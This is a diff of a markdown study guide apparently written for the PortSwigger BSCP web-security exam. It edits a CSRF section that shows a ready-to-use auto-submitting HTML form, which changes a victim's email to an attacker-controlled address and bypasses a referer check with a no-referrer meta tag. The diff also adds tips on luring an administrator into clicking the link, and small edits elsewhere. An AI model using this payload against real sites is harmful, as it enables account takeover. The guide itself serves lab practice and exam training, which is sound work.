@@ -1434,7 +1434,7 @@ Referrer-Policy: unsafe-url
   
 ### Referer Header Present  
 
->In the update email request when changing the `referer` header the response indicate `Invalid referer header`, ***identifying*** CSRF vulnerability. Using the `<meta name="referrer" content="no-referrer">` as part of the exploit server CSRF PoC this control can be bypassed.  
+>In the update email request when changing the `referer` header the response indicate `Invalid referer header`, ***identifying*** CSRF vulnerability. Using the `<meta name="referrer" content="no-referrer">` as part of the exploit server CSRF PoC this control can be bypassed. This instruct the exploit server to Deliver Exploit to victim without `referer` header.  
 
 ```html
 <html>
@@ -1442,7 +1442,7 @@ Referrer-Policy: unsafe-url
   <body>
 <meta name="referrer" content="no-referrer">
     <form action="https://TARGET.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="hackers&#64;EXPLOIT&#46;NET" />
+      <input type="hidden" name="email" value="administrator&#64;EXPLOIT&#46;NET" />
       <input type="submit" value="Submit request" />
     </form>
     <script>
@@ -1452,6 +1452,8 @@ history.pushState('', '', '/');
   </body>
 </html>
 ```  
+
+>This is interactive exploit and in BSCP exam if the stage 1 exploit was non interactive then this can be used to obtain administrator interaction by her clicking on the link to change their password. Note to check the `source code` of the change email page for any additional form id values.  
 
 ![csrf referer present](images/csrf-referer-present.png)  
 
@@ -3195,7 +3197,7 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 ![MicahVanDeusens-blog](images/MicahVanDeusens-blog.png)  
   
 >The image below is my view of possible vulnerabilities ***identified*** and exploitation to reach the next BSCP exam stage and progress through the exam challenges.  
->I have managed green, orange I am struggling and need to find similar lab challenges to practice, and red to be seen.  
+>I have managed solved the challenges in green using [PortSwigger Academy Labs](https://portswigger.net/web-security/all-labs), but we never stop learning......  
 
 ![Three stages](images/3stages.png)  
   
